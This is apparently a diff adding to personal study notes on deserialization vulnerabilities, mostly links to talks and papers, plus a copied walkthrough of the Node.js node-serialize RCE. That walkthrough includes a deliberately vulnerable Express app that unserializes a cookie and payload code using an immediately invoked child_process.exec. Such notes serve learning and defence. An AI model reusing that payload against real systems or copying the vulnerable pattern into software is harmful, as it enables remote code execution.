@@ -19,12 +19,106 @@ Harden
 
 attack and defense
 
+======================================================
+https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
+======================================================
+android-serialization-vulnerabilities
+https://www.rsaconference.com/writable/presentations/file_upload/mbs-f03-android-serialization-vulnerabilities-revisited.pdf
+
+======================================================
+Exploiting Node.js deserialization bug for Remote Code Execution
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
+
+node-serialize. A cookie value that comes from the request was passed into the unserialize() function provided by the module. 
+Here is a sample node.js application to imitate the code
+
+
+漏洞程式
+var express = require('express');
+var cookieParser = require('cookie-parser');
+var escape = require('escape-html');
+var serialize = require('node-serialize');
+var app = express();
+app.use(cookieParser())
+ 
+app.get('/', function(req, res) {
+ if (req.cookies.profile) {
+   var str = new Buffer(req.cookies.profile, 'base64').toString();
+   var obj = serialize.unserialize(str);
+   if (obj.username) {
+     res.send("Hello " + escape(obj.username));
+   }
+ } else {
+     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
+       maxAge: 900000,
+       httpOnly: true
+     });
+ }
+ res.send("Hello World");
+});
+app.listen(3000);
+
+
+
+漏洞程式分析
+var serialize = require('node-serialize');
+
+建構攻擊碼
+The best way to create a payload is to use the serialize() function of the same module.
+
+I created the following JavaScript object and passed it to serialize() function.
+
+
+var y = {
+ rce : function(){
+ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+ },
+}
+
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+
+
+
+Now we have a serialized string that can be deserialized with unserialize() function. 
+But the problem is code execution won’t happen until you trigger the function corresponding to the rce property of the object.
+
+Later I figured out that we can use JavaScript’s Immediately invoked function expression (IIFE) for calling the function. 
+If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. 
+It works similar to a Class constructor in C++.
+
+Now the serialize() function with the modified object code is called.
+
+var y = {
+rce : function(){
+require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+}(),
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+
+攻擊漏洞
+nodejsshell.py
+
+
+https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
+Java Deserialization and .NET BinaryFormatter deserialization are known to be vulnerable to deserialization
+attacks since they invoke deserialization callbacks during the process. The whole attack boils down to be able to control
+an object type in the deserialized object graph which has a deserialization callback whose logic could be subverted to
+run arbitrary code.
+JSON deserialization, in general, lacks the concept of deserialization callbacks which may lead to a false sense of
+security: these formats being secure to deal with untrusted data. 
+To prove this hypothesis wrong, let's review how
+deserialization libraries normally work.
+
 
 ======================================================
 
 PHPSerialization and Deserialization
 http://www.phpinternalsbook.com/classes_objects/serialization.html
 
+PHP unserialization vulnerabilities: What are we missing?
+https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing
 
 物件生命週期lifecycle
 Understanding PHP objects - SlideShare
@@ -142,6 +236,12 @@ marshalled = Marshal.dump([1, 2, 'string', Object.new])
 
 Marshal.load(marshalled)
 # => [1, 2, "string", #<Object:0x00000002643000>]
+
+
+
+https://github.com/OWASP/railsgoat/wiki/Extras:-Remote-Code-Execution
+
+Rails 動態樣板路徑的風險 By  Shaolin on 2015-07-24
 
 
 RubyGems.org | Ruby 社群Gem 套件管理平台
@@ -285,6 +385,15 @@ To enable these agents, simply add a new JVM parameter:
 
 Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam ...
 https://www.youtube.com/watch?v=VaLSYzEWgVE
+
+Exploiting Deserialization Vulnerabilities in Java
+https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
+
+Java Deserialization Vulnerabilities - The Forgotten Bug Class (DeepSec Edition)
+https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class-deepsec-edition
+
+Defending against Java Deserialization Vulnerabilities
+https://www.slideshare.net/ikkisoft/defending-against-java-deserialization-vulnerabilities
 
 
 https://www.synopsys.com/content/dam/synopsys/sig-assets/whitepapers/exploiting-the-java-deserialization-vulnerability.pdf
